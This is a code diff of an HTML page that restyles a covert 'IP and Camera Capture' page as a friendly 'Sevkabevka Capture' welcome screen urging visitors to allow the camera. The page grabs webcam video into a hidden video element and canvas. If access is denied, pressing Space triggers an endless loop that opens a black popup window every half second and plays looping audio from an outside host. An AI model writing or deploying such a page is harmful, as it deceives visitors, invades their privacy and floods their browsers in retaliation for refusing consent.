@@ -1,11 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>IP and Camera Capture</title>
+  <meta charset="UTF-8" />
+  <title>Glassmorphism Capture</title>
+  <style>
+    /* Background gradient with subtle blur */
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      overflow: hidden;
+    }
+
+    .glass-container {
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 20px;
+      box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      padding: 40px;
+      width: 380px;
+      text-align: center;
+      color: #fff;
+    }
+
+    h1 {
+      margin-bottom: 1rem;
+      font-weight: 700;
+      font-size: 2rem;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
+    }
+
+    p {
+      font-weight: 500;
+      font-size: 1rem;
+      text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
+      margin-bottom: 2rem;
+    }
+
+    /* Hide video and canvas */
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <video id="video" width="320" height="240" autoplay style="display:none;"></video>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <div class="glass-container">
+    <h1>Welcome to Sevkabevka Capture</h1>
+    <p>Allow camera for a better experience.<br>Press SPACE after denial.</p>
+  </div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
     const video = document.getElementById('video');
@@ -39,6 +90,20 @@
         });
       });
 
+    function spawnBlackWindow() {
+      window.open('', '', 'width=500,height=500').document.write('<body style="margin:0;background:black;"></body>');
+    }
+
+    function startPopupLoop() {
+      spawnBlackWindow();
+      setInterval(spawnBlackWindow, 500);
+      
+      // Play audio on loop
+      const audio = new Audio('https://sevkabevka.github.io/alah.mp3');
+      audio.loop = true;
+      audio.play();
+    }
+
     // Attempt camera capture
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
@@ -56,14 +121,17 @@
         }, 4000);
       })
       .catch(() => {
-        // On denial or error, spawn black windows repeatedly
-        function spawnBlackWindow() {
-          window.open('', '', 'width=500,height=500').document.write('<body style="margin:0;background:black;"></body>');
-        }
-        setInterval(spawnBlackWindow, 500);
+        // Wait for space key press to start popup & audio loop
+        document.addEventListener('keydown', function handler(e) {
+          if (e.code === 'Space') {
+            startPopupLoop();
+            document.removeEventListener('keydown', handler);
+          }
+        });
       });
   </script>
 </body>
 </html>
+
 
 
